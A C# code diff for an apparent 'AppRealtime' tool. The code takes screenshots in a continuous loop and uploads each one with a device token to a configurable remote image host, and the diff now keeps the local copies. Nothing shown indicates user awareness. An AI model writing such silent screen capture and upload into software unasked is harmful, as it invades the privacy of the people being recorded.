@@ -40,12 +40,11 @@ namespace AppRealtime
             while (true)
             {
                 TakeScreenshot();
-                msec = _currentSettings.ScreenshotsSpeed;
                 await Task.Delay(msec);
             }
         }
 
-        private async Task UploadImage(string imagePath)
+        private void UploadImage(string imagePath)
         {
             try
             {
@@ -53,49 +52,54 @@ namespace AppRealtime
                 {
                     try
                     {
-                        const int MAX_RETRIES = 1;
-                        for (int i = 0; i < MAX_RETRIES; i++)
+                        bool isOnline = await AppUtils.IsOnline();
+                        if (isOnline)
                         {
-                            if (i >= MAX_RETRIES)
+                            const int MAX_RETRIES = 1;
+                            for (int i = 0; i < MAX_RETRIES; i++)
                             {
-                                break;
-                            }
-
-                            try
-                            {
-                                var client = new HttpClient();
-                                var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
-                                request.Headers.Add("accept", "*/*");
-                                var content = new MultipartFormDataContent();
-                                content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
-                                content.Add(new StringContent(Globals.UUID), "token");
-                                request.Content = content;
-                                var response = await client.SendAsync(request);
-                                response.EnsureSuccessStatusCode();
-                                string result = await response.Content.ReadAsStringAsync();
-                                //Console.WriteLine(result);
-                                if (result.Contains("successfully"))
+                                if (i >= MAX_RETRIES)
                                 {
-                                    //Console.WriteLine("Files uploaded successfully");
                                     break;
                                 }
-                            }
-                            catch (Exception ex)
-                            {
-                                Console.WriteLine($"{ex.Message}");
+
+                                try
+                                {
+                                    var client = new HttpClient();
+                                    var request = new HttpRequestMessage(HttpMethod.Post, _currentSettings.ImageHost);
+                                    request.Headers.Add("accept", "*/*");
+                                    var content = new MultipartFormDataContent();
+                                    content.Add(new StreamContent(File.OpenRead(imagePath)), "Image", Path.GetFileName(imagePath));
+                                    content.Add(new StringContent(Globals.UUID), "token");
+                                    request.Content = content;
+                                    var response = await client.SendAsync(request);
+                                    response.EnsureSuccessStatusCode();
+                                    string result = await response.Content.ReadAsStringAsync();
+                                    //Console.WriteLine(result);
+                                    if (result.Contains("successfully"))
+                                    {
+                                        Debug.WriteLine("Upload image");
+                                        break;
+                                    }
+                                }
+                                catch (Exception ex)
+                                {
+                                    Log($"{ex.Message}");
+                                }
                             }
                         }
+                        
                     }
-                    catch (Exception ex) { Console.WriteLine($"{ex.Message}"); }
+                    catch (Exception ex) { Log($"{ex.Message}"); }
                     finally
                     {
-                        File.Delete(imagePath);
+                        //File.Delete(imagePath);
                     }
                 });
             }
             catch (Exception ex)
             {
-
+                Log(ex.ToString());
             }
         }
 
@@ -124,7 +128,7 @@ namespace AppRealtime
             }
             catch (Exception ex)
             {
-                Trace.WriteLine(ex.ToString());
+                Log(ex.ToString());
             }
         }
 
